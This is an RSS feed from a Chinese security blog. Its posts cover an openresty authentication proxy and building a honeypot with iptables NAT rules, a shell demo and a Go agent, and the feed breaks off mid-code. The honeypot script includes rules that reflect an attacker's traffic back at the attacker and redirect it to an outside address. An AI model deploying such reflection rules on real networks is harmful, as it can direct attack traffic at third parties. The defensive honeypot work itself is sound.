<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">
  <channel>
    <title>记录人生旅程中的迷茫与探索</title>
    <link>http://www.xsec.io/</link>
    <description>信息安全,程序开发,linux,读书</description>
    <managingEditor> (pugo)</managingEditor>
    <pubDate>Wed, 13 Jul 2016 14:48:04 +0800</pubDate>
    <item>
      <title>安全认证代理的透明接入</title>
      <link>http://www.xsec.io/2016/7/13/Transparent-embedding-security-proxy.html</link>
      <description>&lt;h2 id=&#34;背景&#34;&gt;背景&lt;/h2&gt;&#xA;&#xA;&lt;p&gt;之前在sina做一个移动办公应用的安全对外发布代理（新浪口袋）时，是在openresty中的location中专门提供了认证的接口，app需要认证时将认证信息全部发给代理，在代理层进行动态口令与静态口令的认下。&lt;/p&gt;&#xA;&#xA;&lt;p&gt;认证通过后，再由代理在header中附加了认证信息给后端。现在又接到了类似项目，就改为了透明接入的方式，现有的客户端与服务器端只需做很少的改动就能接入。&#xA;不方便多说，只简单提一下：&#xA;1. 安全代理层与后端共有2重的身份认证，访问后端服务器时，如果代理层的身份认证没通过则返回一个特定的json串，客户端app就知道该发起登录认证的请求了。&#xA;1. 认证的接口是在白名单中放行的，不做访问控制，但是代理会劫持请求的响应信息，通过后端服务器的返回结果，代理便可判断用户是否登录成功，是否颁发有实效的token。&lt;/p&gt;&#xA;&#xA;&lt;h2 id=&#34;openresty中的配置&#34;&gt;openresty中的配置&lt;/h2&gt;&#xA;&#xA;&lt;p&gt;openresty的配置大致如下：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;&#xA;upstream proxy_app.xsec.io {&#xA;        server 1.1.1.1:443;&#xA;    }&#xA;&#xA; server {&#xA;        listen       443;&#xA;        server_name  app.xsec.io;&#xA;        client_max_body_size 100m;&#xA;        charset utf-8;&#xA;        access_log      /var/log/nginx/app.xsec.io-access.log Merpproxy;&#xA;        error_log       /var/log/nginx/app.xsec.io-debug.log debug;&#xA;&#xA;        location ~* ^/(login/CheckPhone|login/checkCode|APP) {&#xA;                proxy_connect_timeout 360s;&#xA;                proxy_read_timeout 5400s;&#xA;                proxy_send_timeout 5400s;&#xA;                proxy_pass_header Server;&#xA;                proxy_set_header Host $http_host;&#xA;                proxy_redirect off;&#xA;                proxy_set_header X-Real-IP $remote_addr;&#xA;                proxy_set_header X-Scheme $scheme;&#xA;                proxy_pass http://proxy_app.xsec.io;&#xA;        }&#xA;&#xA;        location ~* ^/login/CheckLdap {&#xA;&#xA;            content_by_lua &#39;&#xA;            helper.get_post_info()&#xA;            &#39;;&#xA;&#xA;            header_filter_by_lua &#39;&#xA;            local result, username, device_info = helper.chk_login()&#xA;            local timestamp = ngx.time()&#xA;            local secure_key = config.access_key.key&#xA;            local sign = access_key.make_sign(secure_key, timestamp)&#xA;&#xA;            if result then&#xA;                local resp = access_key.create_key(username, device_info, key, sign, timestamp, 0)&#xA;                -- ngx.log(ngx.DEBUG, string.format(&amp;quot;resp:%s, resp.text:%s, type:%s&amp;quot;, resp, resp.text, type(resp.text)))&#xA;                -- helper.make_resp(resp)&#xA;                ngx.ctx.resp = resp or {}&#xA;                helper.make_cookies(resp)&#xA;            end&#xA;            &#39;;&#xA;&#xA;            body_filter_by_lua &#39;&#xA;                local body = helper.get_resp_body()&#xA;                ngx.log(ngx.DEBUG, string.format(&amp;quot;body:%s, type of body:%s&amp;quot;, body, type(body)))&#xA;                local resp = ngx.ctx.resp or {}&#xA;                ngx.log(ngx.DEBUG, string.format(&amp;quot;resp:%s, resp.text:%s, type:%s&amp;quot;, resp, resp.text, type(resp.text)))&#xA;                helper.make_resp(body, resp)&#xA;            &#39;;&#xA;&#xA;            proxy_set_header authorization xsec_security;&#xA;            proxy_pass_header Server;&#xA;            # proxy_set_header Host $http_host;&#xA;            proxy_set_header Host proxy_app.xsec.io;&#xA;            proxy_redirect off;&#xA;            proxy_set_header X-Real-IP $remote_addr;&#xA;            proxy_set_header X-Scheme $scheme;&#xA;            proxy_pass $scheme://proxy_app.xsec.io;&#xA;            }&#xA;            error_page  404              /index.html;&#xA;            error_page   500 502 503 504  /index.html;&#xA;    }&#xA;&#xA;# http protocol&#xA;server {&#xA;        listen       80;&#xA;        ssl off;&#xA;        server_name  proxy_app.xsec.io;&#xA;        rewrite ^(.*) https://app.mioffice.cn/$1 permanent;&#xA;    }&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt;&#xA;&#xA;&lt;h3 id=&#34;代码解读&#34;&gt;代码解读&lt;/h3&gt;&#xA;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;location ~* ^/(login/CheckPhone|login/checkCode|APP)是设备激活阶段需要的短信验证码获取及输入阶段，不做拦截&lt;/li&gt;&#xA;&#xA;&lt;li&gt;&lt;p&gt;location ~* ^/login/CheckLdap是输入加密的ldap密码阶段，我们在透明接入就实现在这部分：&lt;/p&gt;&#xA;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;content_by_lua阶段中获取了用户的登录信息，比如用户名、设备信息等&lt;/li&gt;&#xA;&lt;li&gt;header_filter_by_lua阶段判断了用户是否登录成功（成功的话服务器会set-cookie，否则不会set-cookie），也可以放在body_filter_by_lua阶段，根据服务器返回的json判断&#xA;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;登录成功的话，代理服务器会生成与账户、设备唯一绑定的认证key，并设备cookies&lt;/li&gt;&#xA;&lt;li&gt;将认证key保存到ctx中，方便在body_filter_by_lua阶段中使用&lt;/li&gt;&#xA;&lt;/ol&gt;&lt;/li&gt;&#xA;&lt;li&gt;body_filter_by_lua阶段中拦截了服务器返回的json，反序列化后将代理的认证信息插入后再以json的方式发给客户端&#xA;&lt;br /&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&lt;/li&gt;&#xA;&#xA;&lt;li&gt;&lt;p&gt;客户端激活成功后，不再使用ldap（ldap一旦泄漏，所有内网的系统都可以登录了），只使用代理维护的key与totp进行双因素认证。&lt;/p&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;</description>
      <pubDate>Wed, 13 Jul 2016 13:29:12 +0000</pubDate>
    </item>
    <item>
      <title>更换blog的程序了</title>
      <link>http://www.xsec.io/2016/7/8/replace-old-blog.html</link>
      <description>&lt;p&gt;以前的老blog用的是&lt;a href=&#34;http://fuxiaohei.me/&#34;&gt;fuxiaohei&lt;/a&gt;用go写的，无数据库，部署、维护很方便，但是代码高亮不太漂亮。&lt;/p&gt;&#xA;&#xA;&lt;p&gt;最近几天试了下fuxiaohei新出的静态站点生成系统&lt;a href=&#34;https://github.com/go-xiaohei/pugo&#34;&gt;pugo&lt;/a&gt;，操作非常方便，markdown格式书写，可以自动监视文件的变更，实时生成新页面。&lt;/p&gt;&#xA;&#xA;&lt;p&gt;我用来当做工作用的文档工具了，使用了几天体验很好，干脆就把blog也换了吧，之前的内容就不迁移了，如果想查看以前的内容，可以访问&lt;a href=&#34;http://x.xsec.io&#34;&gt;http://x.xsec.io&lt;/a&gt;&lt;/p&gt;&#xA;</description>
      <pubDate>Fri, 08 Jul 2016 16:45:11 +0000</pubDate>
    </item>
    <item>
      <title>自制蜜罐之前端部分</title>
      <link>http://www.xsec.io/2016/7/8/how-to-develop-a-honeypot.html</link>
      <description>&lt;h2 id=&#34;自制蜜罐&#34;&gt;自制蜜罐&lt;/h2&gt;&#xA;&#xA;&lt;h3 id=&#34;背景&#34;&gt;背景&lt;/h3&gt;&#xA;&#xA;&lt;p&gt;生产系统的内网部署蜜罐后可以监控到黑客对内网的探测及攻击行为，方便安全工程师第一时间发现被入侵并及时止损，防止出现公司重要数据被窃取却浑然不然的情况。&#xA;所以我们有必要在重要业务的内网机房部署蜜罐。&lt;/p&gt;&#xA;&#xA;&lt;h3 id=&#34;需求&#34;&gt;需求&lt;/h3&gt;&#xA;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;第一时间发现攻击者&lt;/li&gt;&#xA;&lt;li&gt;攻击行为及指纹记录、识别&lt;/li&gt;&#xA;&lt;li&gt;覆盖到全部的协议及端口&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;p&gt;目前市面上已经有许多商业或开源的蜜罐系统，如&lt;a href=&#34;https://github.com/paralax/awesome-honeypots&#34;&gt;awesome-honeypots&lt;/a&gt;中收集了大量的开源的蜜罐系统，&#xA;但是这些开源的蜜罐系统存在以下问题：&lt;/p&gt;&#xA;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;安装、部署比较复杂、繁琐，学习成本高&lt;/li&gt;&#xA;&lt;li&gt;自定义或扩展功能的成本高&lt;/li&gt;&#xA;&lt;li&gt;覆盖不到全部的协议及端口&lt;/li&gt;&#xA;&lt;li&gt;开发进度滞后，没有覆盖到最新的redis、elastic、stuct2等漏洞的利用的监控&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;p&gt;所以我们有必要自己开发一套易于部署、覆盖全端口全协议及最新漏洞的蜜罐系统。&lt;/p&gt;&#xA;&#xA;&lt;h2 id=&#34;蜜罐架构图&#34;&gt;蜜罐架构图&lt;/h2&gt;&#xA;&#xA;&lt;p&gt;&lt;img src=&#34;/media/images_honeypot/topology.png&#34; alt=&#34;架构图&#34; /&gt;&lt;/p&gt;&#xA;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Agent&#xA;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;记录攻击log并发送到server中&lt;/li&gt;&#xA;&lt;li&gt;按照策略将攻击流量转到后端server&lt;/li&gt;&#xA;&lt;li&gt;定期更新policy&lt;/li&gt;&#xA;&lt;/ol&gt;&lt;/li&gt;&#xA;&lt;li&gt;Server:&#xA;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;接收来自各agent的攻击log&lt;/li&gt;&#xA;&lt;li&gt;通过策略判断是否需要报警&lt;/li&gt;&#xA;&lt;li&gt;攻击log及报警log保存、备份&lt;/li&gt;&#xA;&lt;/ol&gt;&lt;/li&gt;&#xA;&lt;li&gt;Backend&#xA;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;利用docker构建常见的各服务&lt;/li&gt;&#xA;&lt;li&gt;攻击行为记录、指纹识别&lt;/li&gt;&#xA;&lt;/ol&gt;&lt;/li&gt;&#xA;&lt;li&gt;Policy server&#xA;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Agent和server的策略管理&lt;/li&gt;&#xA;&lt;/ol&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;h2 id=&#34;agent的实现&#34;&gt;Agent的实现&lt;/h2&gt;&#xA;&#xA;&lt;p&gt;Agent利用iptables记录了对Agent所有端口的tcp及udp协议的访问log，并用iptables将请求按policy指定的规则转到了后端的攻击行为识别服务器中。&lt;/p&gt;&#xA;&#xA;&lt;h3 id=&#34;iptables基础&#34;&gt;iptables基础&lt;/h3&gt;&#xA;&#xA;&lt;p&gt;netfilter/iptables（简称为iptables）组成Linux平台下的包过滤防火墙，与大多数的Linux软件一样，这个包过滤防火墙是免费的，它可以代替昂贵的商业防火墙解决方案，完成封包过滤、封包重定向和网络地址转换（NAT）等功能。&#xA;Netfilter是Linux操作系统核心层内部的一个数据包处理模块，它具有如下功能：&lt;/p&gt;&#xA;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;网络地址转换(Network Address Translate)&lt;/li&gt;&#xA;&lt;li&gt;数据包内容修改&lt;/li&gt;&#xA;&lt;li&gt;包过滤的防火墙功能&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;p&gt;真正实现防火墙功能的是处于内核级的netfilter，iptables是应用层的netfilter的管理工具，netfilter与iptables在linux操作系统中的位置及角色如下图所示：&lt;/p&gt;&#xA;&#xA;&lt;p&gt;&lt;img src=&#34;/media/images_honeypot/iptables1.png&#34; alt=&#34;iptables1&#34; /&gt;&lt;/p&gt;&#xA;&#xA;&lt;p&gt;Netfilter提供了数据包的5个Hook Point，当有数据通过这些位置时，钩子就会触发，从而可以调用我们自定义的函数，这5个挂载点分别为：&lt;/p&gt;&#xA;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;NF_IP_PRE_ROUTING&lt;/li&gt;&#xA;&lt;li&gt;NF_IP_LOCAL_IN&lt;/li&gt;&#xA;&lt;li&gt;NF_IP_FORWARD&lt;/li&gt;&#xA;&lt;li&gt;NF_IP_LOCAL_OUT&lt;/li&gt;&#xA;&lt;li&gt;NF_IP_POST_ROUTING&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&#xA;&lt;p&gt;Netfilter所设置的规则是存放在内核内存中的，而 iptables 是一个应用层的应用程序，它通过 Netfilter 放出的接口来对存放在内核内存中的 XXtables（Netfilter的配置表）进行修改。&lt;/p&gt;&#xA;&#xA;&lt;p&gt;这个XXtables由表tables、链chains、规则rules组成，iptables在应用层负责修改这个规则文件。&lt;/p&gt;&#xA;&#xA;&lt;p&gt;iptables内置了4个表，即Filter表、Nat表、Mangle表和Raw表，分别用于实现包过滤、网络地址转换、包重构(修改)和数据跟踪处理。&lt;/p&gt;&#xA;&#xA;&lt;p&gt;这几个表的优先顺序为Raw -&amp;gt; Mangle -&amp;gt; Nat -&amp;gt; Filter。&#xA;iptables表和链的结构如下图所示：&lt;/p&gt;&#xA;&#xA;&lt;p&gt;&lt;img src=&#34;/media/images_honeypot/iptables2.png&#34; alt=&#34;iptables2&#34; /&gt;&lt;/p&gt;&#xA;&#xA;&lt;h4 id=&#34;iptables中的规则表-table&#34;&gt;iptables中的规则表（table）&lt;/h4&gt;&#xA;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Raw表有两个链：OUTPUT、PREROUTING，作用为决定数据包是否被状态跟踪机制处理&lt;/li&gt;&#xA;&lt;li&gt;Mangle表有五个链：PREROUTING、POSTROUTING、INPUT、OUTPUT、FORWARD，作用为修改数据包的服务类型、TTL、并且可以配置路由实现QOS&lt;/li&gt;&#xA;&lt;li&gt;Nat表有三个链：PREROUTING、POSTROUTING、OUTPUT，作用为用于网络地址转换&lt;/li&gt;&#xA;&lt;li&gt;Filter表有三个链：INPUT、FORWARD、OUTPUT，作用为数据包过滤&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;h4 id=&#34;iptables中的规则链接-chain&#34;&gt;iptables中的规则链接（chain）&lt;/h4&gt;&#xA;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;INPUT——进来的数据包应用此规则链中的策略。&lt;/li&gt;&#xA;&lt;li&gt;OUTPUT——外出的数据包应用此规则链中的策略。&lt;/li&gt;&#xA;&lt;li&gt;FORWARD——转发数据包时应用此规则链中的策略。&lt;/li&gt;&#xA;&lt;li&gt;PREROUTING——对数据包作路由选择前应用此链中的规则，所有的数据包进来的时侯都先由这个链处理。&lt;/li&gt;&#xA;&lt;li&gt;POSTROUTING——对数据包作路由选择后应用此链中的规则，所有的数据包出来的时侯都先由这个链处理。&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;h4 id=&#34;iptales中的数据流&#34;&gt;iptales中的数据流&lt;/h4&gt;&#xA;&#xA;&lt;p&gt;&lt;img src=&#34;/media/images_honeypot/iptables3.png&#34; alt=&#34;iptables3&#34; /&gt;&lt;/p&gt;&#xA;&#xA;&lt;p&gt;iptables中的数据流可以总结为以下3句话：&lt;/p&gt;&#xA;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;发往本地的包，数据流向为：PREROUTING -&amp;gt; INPUT&lt;/li&gt;&#xA;&lt;li&gt;发往其他地址的包，数据流向为：PREROUTING -&amp;gt; FORWARD -&amp;gt; POSTROUTING&lt;/li&gt;&#xA;&lt;li&gt;从本地发出的包的数据流向为： OUTPUT -&amp;gt; POSTROUTING&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;h4 id=&#34;iptables规则管理&#34;&gt;iptables规则管理&lt;/h4&gt;&#xA;&#xA;&lt;p&gt;&lt;img src=&#34;/media/images_honeypot/iptables4.png&#34; alt=&#34;iptables4&#34; /&gt;&lt;/p&gt;&#xA;&#xA;&lt;p&gt;&lt;img src=&#34;/media/images_honeypot/iptables5.png&#34; alt=&#34;iptables5&#34; /&gt;&lt;/p&gt;&#xA;&#xA;&lt;h4 id=&#34;iptables命令参数&#34;&gt;iptables命令参数&lt;/h4&gt;&#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[-t 表名]：该规则所操作的哪个表，可以使用filter、nat等，如果没有指定则默认为filter&#xA;-A：新增一条规则，到该规则链列表的最后一行&#xA;-I：插入一条规则，原本该位置上的规则会往后顺序移动，没有指定编号则为1&#xA;-D：从规则链中删除一条规则，要么输入完整的规则，或者指定规则编号加以删除&#xA;-R：替换某条规则，规则替换不会改变顺序，而且必须指定编号。&#xA;-P：设置某条规则链的默认动作&#xA;-nL：-L、-n，查看当前运行的防火墙规则列表&#xA;chain名：指定规则表的哪个链，如INPUT、OUPUT、FORWARD、PREROUTING等&#xA;[规则编号]：插入、删除、替换规则时用，--line-numbers显示号码&#xA;[-i|o 网卡名称]：i是指定数据包从哪块网卡进入，o是指定数据包从哪块网卡输出&#xA;[-p 协议类型]：可以指定规则应用的协议，包含tcp、udp和icmp等&#xA;[-s 源IP地址]：源主机的IP地址或子网地址&#xA;[--sport 源端口号]：数据包的IP的源端口号&#xA;[-d目标IP地址]：目标主机的IP地址或子网地址&#xA;[--dport目标端口号]：数据包的IP的目标端口号&#xA;-m：extend matches，这个选项用于提供更多的匹配参数，如：&#xA;&#xA;-m state --state ESTABLISHED,RELATED&#xA;-m tcp --dport 22&#xA;-m multiport --dports 80,8080&#xA;-m icmp --icmp-type 8&#xA;&amp;lt;-j 动作&amp;gt;：处理数据包的动作，包括ACCEPT、DROP、REJECT等&#xA;&lt;/code&gt;&lt;/pre&gt;&#xA;&#xA;&lt;h3 id=&#34;利用shell实现一个demo&#34;&gt;利用shell实现一个demo&lt;/h3&gt;&#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/bash&#xA;:&amp;lt;&amp;lt;BLOCK&#xA;Copyright (c) 2016 www.xsec.io&#xA;&#xA; - User: netxfly&amp;lt;x@xsec.io&amp;gt;&#xA; - Date: 2016/6/20&#xA;&#xA;Permission is hereby granted, free of charge, to any person obtaining a copy&#xA;of this software and associated documentation files (the &amp;quot;Software&amp;quot;), to deal&#xA;in the Software without restriction, including without limitation the rights&#xA;to use, copy, modify, merge, publish, distribute, sublicense, and/or sell&#xA;copies of the Software, and to permit persons to whom the Software is&#xA;furnished to do so, subject to the following conditions:&#xA;&#xA;The above copyright notice and this permission notice shall be included in&#xA;all copies or substantial portions of the Software.&#xA;&#xA;THE SOFTWARE IS PROVIDED &amp;quot;AS IS&amp;quot;, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR&#xA;IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,&#xA;FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE&#xA;AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER&#xA;LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,&#xA;OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN&#xA;THE SOFTWARE.&#xA;BLOCK&#xA;&#xA;WHITELIST_IPs=(1.1.1.1.1 111.111.111.111 222.222.222.222)&#xA;WHITELIST_PORTS=&amp;quot;88,96,99,55522&amp;quot;&#xA;BACKEND=&amp;quot;10.10.10.10&amp;quot;&#xA;ATTACK_IP=&amp;quot;9.9.9.9.9&amp;quot;&#xA;&#xA;ATTACK_IP1=&amp;quot;9.9.9.9.0/24&amp;quot;&#xA;UNREAL_TARGET=&amp;quot;220.181.112.244:80&amp;quot;&#xA;&#xA;# set ip_forward&#xA;function set_ip_forward()&#xA;{&#xA;    /sbin/sysctl -w net.ipv4.ip_forward=1&#xA;    sysctl -p&#xA;}&#xA;&#xA;# delete custom iptables chain&#xA;function delete_policy()&#xA;{&#xA;    /sbin/iptables -t nat -F &#xA;    /sbin/iptables -t nat -X HONEYPOT&#xA;    /sbin/iptables -t nat -X FIREWALL_IN&#xA;    /sbin/iptables -t nat -X FIREWALL_OUT&#xA;&#xA;    /sbin/iptables -t filter -F &#xA;    /sbin/iptables -t filter -X WHITELIST&#xA;}&#xA;&#xA;# init iptables chain&#xA;function init_policy()&#xA;{&#xA;    /sbin/iptables -t nat -N HONEYPOT&#xA;    /sbin/iptables -t nat -A PREROUTING -j HONEYPOT&#xA;&#xA;    /sbin/iptables -t filter -N WHITELIST&#xA;    /sbin/iptables -t filter -A INPUT -j WHITELIST&#xA;&#xA;    /sbin/iptables -t nat -N FIREWALL_IN&#xA;    /sbin/iptables -t nat -A PREROUTING -j FIREWALL_IN&#xA;    /sbin/iptables -t nat -N FIREWALL_OUT&#xA;    /sbin/iptables -t nat -A POSTROUTING -j FIREWALL_OUT&#xA;&#xA;    /sbin/iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE&#xA;&#xA;    /sbin/iptables -t nat -A HONEYPOT -i eth0 -p tcp -m state --state NEW,ESTABLISHED,RELATED -j LOG --log-prefix &amp;quot;iptables:&amp;quot;&#xA;&#xA;}&#xA;&#xA;# set white policy(ip white)&#xA;function set_white_policy()&#xA;{&#xA;    for ip in $WHITELIST_IPs&#xA;    do&#xA;        /sbin/iptables -t filter -A WHITELIST -s $ip -j DROP&#xA;    done&#xA;}&#xA;&#xA;# set honeypot policy(ports white)&#xA;function set_honeypot_policy()&#xA;{&#xA;    /sbin/iptables -A HONEYPOT -t nat -i eth0 -p tcp -m multiport ! --dport $WHITELIST_PORTS -j DNAT --to-destination $BACKEND&#xA;    /sbin/iptables -A HONEYPOT -t nat -i eth0 -p udp -m multiport ! --dport $WHITELIST_PORTS -j DNAT --to-destination $BACKEND&#xA;    # /sbin/iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE&#xA;}&#xA;&#xA;# start honeypot&#xA;function StartHoneypot()&#xA;{&#xA;    set_ip_forward&#xA;    init_policy&#xA;    set_white_policy&#xA;    set_honeypot_policy&#xA;}&#xA;&#xA;# stop honeypot&#xA;function StopHoneypot()&#xA;{&#xA;    delete_policy&#xA;}&#xA;&#xA;function showHelp()&#xA;{&#xA;    echo &amp;quot;Usage: [sudo] ./honeypot.sh  [OPTIONS]&amp;quot;&#xA;    echo &amp;quot;Options:&amp;quot;&#xA;    echo -e &amp;quot;\t-h | --help\t\t show this help&amp;quot;&#xA;    echo -e &amp;quot;\t-start   \t\t start honeypot&amp;quot;&#xA;    echo -e &amp;quot;\t-stop    \t\t stop honeypot&amp;quot;&#xA;}&#xA;&#xA;# Check if user is root&#xA;[ $(id -u) != &amp;quot;0&amp;quot; ] &amp;amp;&amp;amp; { echo &amp;quot;Must run as root, exit1111...&amp;quot; &amp;gt;&amp;amp;2; exit 1; }&#xA;&#xA;while true ; do&#xA;    case &amp;quot;$1&amp;quot; in&#xA;&#xA;        -h|--help)&#xA;            showHelp;&#xA;            echo &amp;quot;&amp;quot;&#xA;            exit 0&#xA;            ;;&#xA;&#xA;        -start|--start)&#xA;        echo &amp;quot;start honeypot&amp;quot;;&#xA;        StartHoneypot;&#xA;        exit 0&#xA;        ;;&#xA;&#xA;        -stop|--stop)&#xA;        echo &amp;quot;stop honeypot&amp;quot;;&#xA;        StopHoneypot;&#xA;        exit 0&#xA;        ;;&#xA;&#xA;        *)&#xA;            # echo &amp;quot;invalid option. $1&amp;quot;&#xA;            showHelp;&#xA;            exit 1&#xA;            ;;&#xA;    esac&#xA;done&#xA;&#xA;function policy_reset()&#xA;{&#xA;    /sbin/iptables -t nat -F FIREWALL_IN&#xA;    /sbin/iptables -t nat -F FIREWALL_OUT&#xA;    iptables -t nat -A FIREWALL_OUT -o eth0 -j MASQUERADE&#xA;}&#xA;&#xA;# # douzhuanxingyi&#xA;function douzhuanxingyi()&#xA;{&#xA;    iptables -t nat -A FIREWALL_IN  -s $ATTACK_IP -j DNAT --to-destination $ATTACK_IP&#xA;    &#xA;}&#xA;&#xA;function jinghuashuiyue()&#xA;{&#xA;    /sbin/iptables -t nat -A FIREWALL_IN -i eth0 -p tcp -m tcp --dport 1:65535 -s $ATTACK_IP1 -j DNAT --to-destination $UNREAL_TARGET&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt;&#xA;&#xA;&lt;h4 id=&#34;demo代码解读&#34;&gt;demo代码解读&lt;/h4&gt;&#xA;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;set_ip_forward函数将net.ipv4.ip_forward设为了1，这样才能开启linux的数据转发功能。&lt;/li&gt;&#xA;&lt;li&gt;init_policy中利用-N指令新建了不同的chain，目的是为了在将同类的操作放到同一个链中，防止在操作规则的过程中影响到其他的iptables规则。&lt;/li&gt;&#xA;&lt;li&gt;set_white_policy为设置白名单，来自白名单的请求直接drop掉，不会转到后端服务器；&lt;/li&gt;&#xA;&lt;li&gt;set_honeypot_policy为设置蜜罐的转发规则，除了服务器管理、监控外的其他端口外的其他请求全部转到后端&lt;/li&gt;&#xA;&lt;li&gt;douzhuanxingyi使用了金庸武侠小说《天龙八部》中武功名，指将攻击者的攻击全部反弹回去&lt;/li&gt;&#xA;&lt;li&gt;jinghuashuiyue是使用了动画片《死神》中蓝染的斩魄刀的名字：(幻觉系最强斩魄刀），指将攻击者的所有请求转到一个伪造的地址中，误导攻击者。&lt;/li&gt;&#xA;&lt;li&gt;在使用了DNAT后，需要在POSTROUTING链中设置SNAT，每条规则都需要设置，操作麻烦且容易出错，用&lt;code&gt;-j MASQUERADE&lt;/code&gt;可以自动完成这些操作&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;h3 id=&#34;golang实现最终的agent&#34;&gt;golang实现最终的agent&lt;/h3&gt;&#xA;&#xA;&lt;p&gt;相比python来说，golang写的程序无任何依赖，直接编译为一个二进制文件就能执行，所以我们选择了golang。&#xA;agent的功能为：&lt;/p&gt;&#xA;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;支持配置，配置文件中为策略的URL，转发数据的网卡名&lt;/li&gt;&#xA;&lt;li&gt;定期从策略服务器中拉取最新的策略并应用&lt;/li&gt;&#xA;&lt;li&gt;将syslog发送到后端的server中&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;p&gt;发送syslog到后端服务器的功能无需开发，centos 6默认全部为rsyslog，只需配置下rsyslog便可将日志发送到后端server，&#xA;配置完需重启rsyslog服务/etc/init.d/rsyslog restart，配置参数如下：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[root@honeypot_agent01 agent]# cat /etc/rsyslog.d/iptables.conf &#xA;:msg,contains,&amp;quot;iptables&amp;quot;  @@111.111.111.111:514&#xA;&lt;/code&gt;&lt;/pre&gt;&#xA;&#xA;&lt;p&gt;111.111.111.111 为蜜罐的server，514为端口，@@表示以TCP发送log，@表示以UDP发送数据&#xA;建议全部使用TCP，个别网络的ACL导致tcp不通时可以使用udp。&lt;/p&gt;&#xA;&#xA;&lt;p&gt;agent的定期运行配置在cronta中，每1分钟更新一次策略&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[root@honeypot_agent01 agent]# crontab -e&#xA;*/1 * * * *  /data/honeypot/agent/honeypot_agent&#xA;&lt;/code&gt;&lt;/pre&gt;&#xA;&#xA;&lt;p&gt;Agent的部分代码如下：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;&#xA;// Get forward policy &amp;amp;&amp;amp; white list&#xA;func GetPolicy() (p Policys, err error) {&#xA;&#xA;    resp, err := http.Get(Url)&#xA;    if err == nil {&#xA;        body, _ := ioutil.ReadAll(resp.Body)&#xA;        json.Unmarshal(body, &amp;amp;p)&#xA;    }&#xA;    defer resp.Body.Close()&#xA;    return p, err&#xA;}&#xA;&#xA;// set iptables&#xA;func SetIptables(policy Policys) {&#xA;    // InitPolicy()&#xA;&#xA;    white_ip_policy := policy.Whiteip&#xA;    // set white policy&#xA;    for _, white_ip := range white_ip_policy {&#xA;        fmt.Println(&amp;quot;/sbin/iptables&amp;quot;, &amp;quot;-t&amp;quot;, &amp;quot;filter&amp;quot;, &amp;quot;-A&amp;quot;, &amp;quot;WHITELIST&amp;quot;, &amp;quot;-i&amp;quot;, interfaceName, &amp;quot;-s&amp;quot;, white_ip, &amp;quot;-j&amp;quot;, &amp;quot;DROP&amp;quot;)&#xA;        exec.Command(&amp;quot;/sbin/iptables&amp;quot;, &amp;quot;-t&amp;quot;, &amp;quot;filter&amp;quot;, &amp;quot;-A&amp;quot;, &amp;quot;WHITELIST&amp;quot;, &amp;quot;-i&amp;quot;, interfaceName, &amp;quot;-s&amp;quot;, white_ip, &amp;quot;-j&amp;quot;, &amp;quot;DROP&amp;quot;).Output()&#xA;    }&#xA;&#xA;    fmt.Println(&amp;quot;/sbin/iptables&amp;quot;, &amp;quot;-t&amp;quot;, &amp;quot;nat&amp;quot;, &amp;quot;-A&amp;quot;, &amp;quot;HONEYPOT&amp;quot;, &amp;quot;-i&amp;quot;, interfaceName, &amp;quot;-p&amp;quot;, &amp;quot;tcp&amp;quot;, &amp;quot;-m&amp;quot;, &amp;quot;multiport&amp;quot;, &amp;quot;!&amp;quot;, &amp;quot;--dports&amp;quot;, strings.Join(policy.Whiteport, &amp;quot;,&amp;quot;), &amp;quot;-j&amp;quot;, &amp;quot;DNAT&amp;quot;, &amp;quot;--to-destination&amp;quot;, policy.Backend)&#xA;    ret, err := exec.Command(&amp;quot;/sbin/iptables&amp;quot;, 